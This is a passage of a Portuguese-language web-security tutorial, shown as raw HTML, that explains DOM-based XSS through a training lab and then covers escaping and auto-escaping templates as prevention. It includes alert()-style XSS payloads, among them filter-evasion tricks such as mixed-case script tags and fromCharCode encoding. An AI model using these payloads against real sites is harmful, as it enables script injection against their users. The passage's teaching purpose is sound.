dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O seu servidor nem sempre verá a payload do XSS </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Nos dois exemplos anteriores, a entrada do usuário foi enviada ao servidor e o servidor respondeu ao usuário exibindo uma página que incluía a entrada do usuário. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No entanto, uma vulnerabilidade de XSS armazenada ou refletida também pode ocorrer sem o envolvimento direto do servidor, se os dados fornecidos pelo usuário forem usados ​​em uma operação de JavaScript insegura. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Ou seja, o XSS pode ocorrer inteiramente no JavaScript e no HTML do lado do cliente (mais especificamente, no DOM), sem que os dados sejam enviados entre o cliente e o servidor. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Chamamos esta subclasse de bugs "XSS baseado em DOM" ou "DOM XSS" para abreviar. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Uma causa comum de erros do DOM XSS é definir o valor innerHTML de um elemento DOM com dados fornecidos pelo usuário.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Dê uma olhada no level 3. Ele usa um fragmento de URL para determinar qual guia exibir.</span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://xss-game.appspot.com/level3" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://xss-game.appspot.com/level3</span></a></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Clique para ver o código fonte do aplicativo.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O aplicativo funciona como esperado quando você clica nas guias. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No entanto, também é possível abrir um URL como: </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://xss-doc.appspot.com/demo/3#'&gt;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">x</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">alert(/DOM-XSS/)</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Você pode copiar e colar o URL acima na "barra de URL" do aplicativo de demonstração acima e clicar no botão " Go ".. Você deve ver um alerta pop-up.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O XSS é acionado porque o script do lado do cliente usa parte do window.location para definir o innerHTML de um dos elementos dentro da página. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Quando você vai para o URL acima, a variável location.hash é definida como</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">#'&gt;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">x</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">alert(/DOM-XSS/)</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . </span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se você olhar para a linha 33 do código-fonte para index.html, verá que a substring de location.hash (a string após o caractere # ) é passada como o argumento para a função chooseTab na linha 8. chooseTab constrói uma img elemento para incorporar uma imagem usando o seguinte: </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">html += </span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"&lt;img src='/static/demos/GEECS"</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> + name + </span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">".jpg' /&gt;"</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O argumento location.hash substring é usado para definir o valor do name; isso resulta no seguinte elemento img:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">'/static/demos/GEECS'</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&gt;&lt;img </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">x</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">alert(/DOM-XSS/)</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">.jpg' /&gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O acima é um HTML válido; no entanto, o navegador não carregará a imagem e, em vez disso, executará o código onerror. Este elemento img é finalmente adicionado ao documento via innerHTML na linha 12.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Outros Exemplos de XXS</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Veja aqui vários exemplos de como conseguir um ataque de XXS:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span></a></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Às vezes o site tem algum mecanismo que não deixa escrever &lt;script&gt;, uma soluçao é capitalizar algumas letras:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;sCriPt&gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">alert()</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/ScRiPt&gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Outro exemplo se o site não deixa colocar aspas, você pode procurar algum site que traduz charcode usar sem aspas:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10.5pt; vertical-align: baseline; white-space: pre-wrap;">&lt;IMG </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10.5pt; vertical-align: baseline; white-space: pre-wrap;">SRC</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10.5pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10.5pt; vertical-align: baseline; white-space: pre-wrap;">javascript:alert(String.fromCharCode(88,83,83))</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10.5pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div></h1><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Prevenindo o XSS</span></h1><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Veja aqui várias dicas:</span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</span></a></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Nada é infalível </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Fornecemos algumas sugestões sobre como você pode minimizar a chance de seu site conter vulnerabilidades XSS. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Mas tenha em mente que tanto a segurança quanto a tecnologia evoluem muito rapidamente; </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">então, não há garantias - o que funciona hoje pode não funcionar totalmente amanhã (hackers podem ser bastante espertos).</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O que posso fazer para evitar o XSS?</span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Uma técnica comum para evitar vulnerabilidades XSS é "escaping". </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O objetivo do escaping de caractere e string é garantir que cada parte de uma string seja interpretada como uma string primitiva, não como um caractere ou código de controle. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Por exemplo, </span><span style="background-color: white; color: #444444; font-family: &quot;arial&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&nbsp;' </span><span style="background-color: white; color: #007000; font-family: &quot;verdana&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&amp;lt;</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: white; color: #444444; font-family: &quot;arial&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;"> ' </span><span style="background-color: white; color: #007000; font-family: &quot;verdana&quot;; font-size: 10pt; vertical-align: baseline; white-space: pre-wrap;">&amp;lt; </span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">é a codificação HTML para o caractere '&lt; '. Se você incluir:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&lt; </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">script</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"> &gt;</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"> alert('testing') </span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&lt; /</span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">script</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"> &gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">no HTML de uma página, o script será executado. Mas se você incluir:</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&amp;lt; script &amp;gt; alert(</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">'testing'</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">) &amp;lt; </span><span style="color: #009926; font-family: &quot;consolas&quot;; font-size: 10pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">/script &amp;gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">no HTML de uma página, ele imprimirá o texto "&lt;script&gt; alert ('testing') &lt;/ script&gt; ", mas não executará o script.</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Ao escapar das tags &lt;script&gt; , impedimos que o script fosse executado. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Tecnicamente, o que fizemos aqui é "codificar" e não "escapar", porém transmitimos o conceito básico de &nbsp;"escapar" (e veremos mais adiante que, no caso do JavaScript, "escaping" da forma correta. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O seguinte pode ajudar a minimizar as chances de o seu site conter vulnerabilidades XSS: </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Usando um sistema de modelo com escape automático sensível ao contexto </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Como escapar manualmente da entrada do usuário (se não for possível usar um sistema de modelo com escape automático com reconhecimento de contexto)</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Compreender os comportamentos comuns do navegador que levam ao XSS </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Aprendendo as boas práticas de sua tecnologia </span></div></li></ul><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O restante desta seção descreve essas medidas em detalhes. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Use um sistema de modelo com escape automático sensível ao contexto </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">A maneira mais simples e melhor de proteger seu aplicativo e seus usuários dos bugs do XSS é usar um </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://en.wikipedia.org/wiki/Web_template_system&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhii393YMPPaQIkSGhm8iaQK1GbsiA" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">web template system</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ou </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://en.wikipedia.org/wiki/Web_application_framework&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhisMVzVmI1usqkT3MvZcxrtQsTtNA" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">web application development framework aplicativo da web</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> que escape automaticamente da saída e esteja ciente do contexto. </span></div><div 